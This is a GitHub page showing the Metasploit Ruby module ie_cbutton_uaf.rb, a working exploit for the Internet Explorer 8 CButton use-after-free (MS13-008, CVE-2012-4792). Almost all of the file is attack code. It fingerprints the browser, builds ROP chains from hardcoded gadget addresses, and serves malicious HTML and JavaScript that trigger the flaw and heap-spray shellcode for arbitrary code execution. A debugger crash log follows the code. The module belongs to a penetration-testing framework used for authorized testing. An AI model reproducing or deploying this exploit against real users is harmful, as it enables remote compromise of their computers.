
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fblob%2Fmaster%2Fmodules%2Fexploits%2Fwindows%2Fbrowser%2Fie_cbutton_uaf.rb)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fblob%2Fmaster%2Fmodules%2Fexploits%2Fwindows%2Fbrowser%2Fie_cbutton_uaf.rb)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  411](/rapid7/metasploit-framework/issues)
* [Pull requests
  38](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

## Files

 master
## Breadcrumbs

1. [metasploit-framework](/rapid7/metasploit-framework/tree/master)
2. /[modules](/rapid7/metasploit-framework/tree/master/modules)
3. /[exploits](/rapid7/metasploit-framework/tree/master/modules/exploits)
4. /[windows](/rapid7/metasploit-framework/tree/master/modules/exploits/windows)
5. /[browser](/rapid7/metasploit-framework/tree/master/modules/exploits/windows/browser)
/
# ie\_cbutton\_uaf.rb

Copy path Blame  Blame
## Latest commit

## History

[History](/rapid7/metasploit-framework/commits/master/modules/exploits/windows/browser/ie_cbutton_uaf.rb)286 lines (243 loc) · 9.18 KB master
## Breadcrumbs

1. [metasploit-framework](/rapid7/metasploit-framework/tree/master)
2. /[modules](/rapid7/metasploit-framework/tree/master/modules)
3. /[exploits](/rapid7/metasploit-framework/tree/master/modules/exploits)
4. /[windows](/rapid7/metasploit-framework/tree/master/modules/exploits/windows)
5. /[browser](/rapid7/metasploit-framework/tree/master/modules/exploits/windows/browser)
/
# ie\_cbutton\_uaf.rb

Top
## File metadata and controls

* Code
* Blame

286 lines (243 loc) · 9.18 KB[Raw](https://github.com/rapid7/metasploit-framework/raw/refs/heads/master/modules/exploits/windows/browser/ie_cbutton_uaf.rb)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##
class MetasploitModule < Msf::Exploit::Remote Rank = NormalRanking
 include Msf::Exploit::Remote::HttpServer::HTML include Msf::Exploit::RopDb #include Msf::Exploit::Remote::BrowserAutopwn #autopwn\_info({ # :ua\_name => HttpClients::IE, # :ua\_minver => "8.0", # :ua\_maxver => "8.0", # :javascript => true, # :os\_name => OperatingSystems::Match::WINDOWS, # :rank => GoodRanking #})
 def initialize(info={}) super(update\_info(info, 'Name' => "MS13-008 Microsoft Internet Explorer CButton Object Use-After-Free Vulnerability", 'Description' => %q{ This module exploits a vulnerability found in Microsoft Internet Explorer. A use-after-free condition occurs when a CButton object is freed, but a reference is kept and used again during a page reload, an invalid memory that's controllable is used, and allows arbitrary code execution under the context of the user.
 Please note: This vulnerability has been exploited in the wild targeting mainly China/Taiwan/and US-based computers. }, 'License' => MSF\_LICENSE, 'Author' => [ 'eromang', 'mahmud ab rahman', 'juan vazquez', #Metasploit 'sinn3r', #Metasploit 'Peter Vreugdenhil' #New trigger & new exploit technique ], 'References' => [ [ 'CVE', '2012-4792' ], [ 'OSVDB', '88774' ], [ 'US-CERT-VU', '154201' ], [ 'BID', '57070' ], [ 'MSB', 'MS13-008' ], [ 'URL', 'http://blog.fireeye.com/research/2012/12/council-foreign-relations-water-hole-attack-details.html'], [ 'URL', 'http://eromang.zataz.com/2012/12/29/attack-and-ie-0day-informations-used-against-council-on-foreign-relations/'], [ 'URL', 'http://technet.microsoft.com/en-us/security/advisory/2794220' ], [ 'URL', 'http://blogs.technet.com/b/srd/archive/2012/12/29/new-vulnerability-affecting-internet-explorer-8-users.aspx' ], [ 'URL', 'http://blog.exodusintel.com/2013/01/02/happy-new-year-analysis-of-cve-2012-4792/' ], [ 'URL', 'https://www.rapid7.com/blog/post/2012/12/29/microsoft-internet-explorer-0-day-marks-the-end-of-2012' ] ], 'Payload' => { 'BadChars' => "\x00", 'Space' => 1024, 'DisableNops' => true }, 'DefaultOptions' => { 'InitialAutoRunScript' => 'post/windows/manage/priv\_migrate' }, 'Platform' => 'win', 'Targets' => [ [ 'Automatic', {} ], [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt } ], [ 'IE 8 on Windows Vista', { 'Rop' => :jre } ], [ 'IE 8 on Windows Server 2003', { 'Rop' => :msvcrt } ], [ 'IE 8 on Windows 7', { 'Rop' => :jre } ] ], 'Privileged' => false, 'DisclosureDate' => '2012-12-27', 'DefaultTarget' => 0))
 register\_options( [ OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false]) ])
 end
 def get\_target(agent) #If the user is already specified by the user, we'll just use that return target if target.name != 'Automatic'
 nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || '' ie = agent.scan(/MSIE (\d)/).flatten[0] || ''
 ie\_name = "IE #{ie}"
 case nt when '5.1' os\_name = 'Windows XP SP3' when '5.2' os\_name = 'Windows Server 2003' when '6.0' os\_name = 'Windows Vista' when '6.1' os\_name = 'Windows 7' else # OS not supported return nil end
 targets.each do |t| if (!ie.empty? and t.name.include?(ie\_name)) and (!nt.empty? and t.name.include?(os\_name)) print\_status("Target selected as: #{t.name}") return t end end
 return nil end
 def junk(n=4) return rand\_text\_alpha(n).unpack("V")[0].to\_i end
 def nop return make\_nops(4).unpack("V")[0].to\_i end
 def get\_payload(t, cli) code = payload.encoded
 # No rop. Just return the payload. return code if t['Rop'].nil?
 # Make post code execution more stable code << rand\_text\_alpha(12000)
 msvcrt\_align = "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500 java\_align = "\x81\xEC\xF0\xD8\xFF\xFF" # sub esp, -10000
 rop\_payload = ''
 case t['Rop'] when :msvcrt case t.name when 'IE 8 on Windows XP SP3' rop\_payload = generate\_rop\_payload('msvcrt', msvcrt\_align + code, {'target'=>'xp'}) when 'IE 8 on Windows Server 2003' rop\_payload = generate\_rop\_payload('msvcrt', msvcrt\_align + code, {'target'=>'2003'}) end else rop\_payload = generate\_rop\_payload('java', java\_align + code) end
 rop\_payload end
 def load\_exploit\_html(my\_target, cli)
 case my\_target['Rop'] when :msvcrt case my\_target.name when 'IE 8 on Windows XP SP3' align\_esp = Rex::Text.to\_unescape([0x77c4d801].pack("V\*")) # ADD ESP, 2C; RET xchg\_esp = Rex::Text.to\_unescape([0x77c15ed5].pack("V\*")) # XCHG EAX, ESP, RET when 'IE 8 on Windows Server 2003' align\_esp = Rex::Text.to\_unescape([0x77bde7f6].pack("V\*")) xchg\_esp = Rex::Text.to\_unescape([0x77bcba5e].pack("V\*")) end else align\_esp = Rex::Text.to\_unescape([0x7C3445F8].pack("V\*")) xchg\_esp = Rex::Text.to\_unescape([0x7C348B05].pack("V\*")) end
 padding = Rex::Text.to\_unescape(Rex::Text.rand\_text\_alpha(4)) js\_payload = Rex::Text.to\_unescape(get\_payload(my\_target, cli))
 html = %Q|<!doctype html> <HTML XMLNS:t ="urn:schemas-microsoft-com:time"> <head> <meta> <?IMPORT namespace="t" implementation="#default#time2"> </meta>
 <script> #{js\_mstime\_malloc}
 function helloWorld() { e\_form = document.getElementById("formelm"); e\_div = document.getElementById("divelm");
 for(i =0; i < 20; i++) { document.createElement('button'); } e\_div.appendChild(document.createElement('button')); e\_div.firstChild.applyElement(e\_form);
 e\_div.innerHTML = ""; e\_div.appendChild(document.createElement('body'));
 CollectGarbage();
 p = unescape("#{padding}"); for (i=0; i < 3; i++) { p += unescape("#{padding}"); } p += unescape("#{js\_payload}");
 fo = unescape("#{align\_esp}"); for (i=0; i < 55; i++) { if (i == 54) { fo += unescape("#{xchg\_esp}"); } else { fo += unescape("#{align\_esp}"); } }
 fo += p;
 mstime\_malloc({shellcode:fo, heapBlockSize:0x58, objId:"myanim"}); } </script> </head>
 <body onload="eval(helloWorld())"> <t:ANIMATECOLOR id="myanim"/> <div id="divelm"></div> <form id="formelm"> </form> </body> </html> |
 return html end
 def on\_request\_uri(cli, request) agent = request.headers['User-Agent'] uri = request.uri print\_status("Requesting: #{uri}")
 my\_target = get\_target(agent) # Avoid the attack if no suitable target found if my\_target.nil? print\_error("Browser not supported, sending 404: #{agent}") send\_not\_found(cli) return end
 html = load\_exploit\_html(my\_target, cli) html = html.gsub(/^ {4}/, '') print\_status("Sending HTML...") send\_response(cli, html, {'Content-Type'=>'text/html'}) endend
=begin(87c.f40): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=12120d0c ebx=0023c218 ecx=00000052 edx=00000000 esi=00000000 edi=0301e400eip=637848c3 esp=020bf834 ebp=020bf8a4 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206mshtml!CMarkup::OnLoadStatusDone+0x504:637848c3 ff90dc000000 call dword ptr <Unloaded\_Ed20.dll>+0xdb (000000dc)[eax] ds:0023:12120de8=????????0:008> kChildEBP RetAddr020bf8a4 635c378b mshtml!CMarkup::OnLoadStatusDone+0x504020bf8c4 635c3e16 mshtml!CMarkup::OnLoadStatus+0x47020bfd10 636553f8 mshtml!CProgSink::DoUpdate+0x52f020bfd24 6364de62 mshtml!CProgSink::OnMethodCall+0x12020bfd58 6363c3c5 mshtml!GlobalWndOnMethodCall+0xfb020bfd78 7e418734 mshtml!GlobalWndProc+0x183020bfda4 7e418816 USER32!InternalCallWinProc+0x28020bfe0c 7e4189cd USER32!UserCallWinProcCheckWow+0x150020bfe6c 7e418a10 USER32!DispatchMessageWorker+0x306020bfe7c 01252ec9 USER32!DispatchMessageW+0xf020bfeec 011f48bf IEFRAME!CTabWindow::\_TabWindowThreadProc+0x461020bffa4 5de05a60 IEFRAME!LCIETab\_ThreadProc+0x2c1020bffb4 7c80b713 iertutil!CIsoScope::RegisterThread+0xab020bffec 00000000 kernel32!BaseThreadStart+0x37
0:008> reax=0c0c0c0c ebx=0023c1d0 ecx=00000052 edx=00000000 esi=00000000 edi=033e9120eip=637848c3 esp=020bf834 ebp=020bf8a4 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202mshtml!CMarkup::OnLoadStatusDone+0x504:637848c3 ff90dc000000 call dword ptr [eax+0DCh] ds:0023:0c0c0ce8=????????=end

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

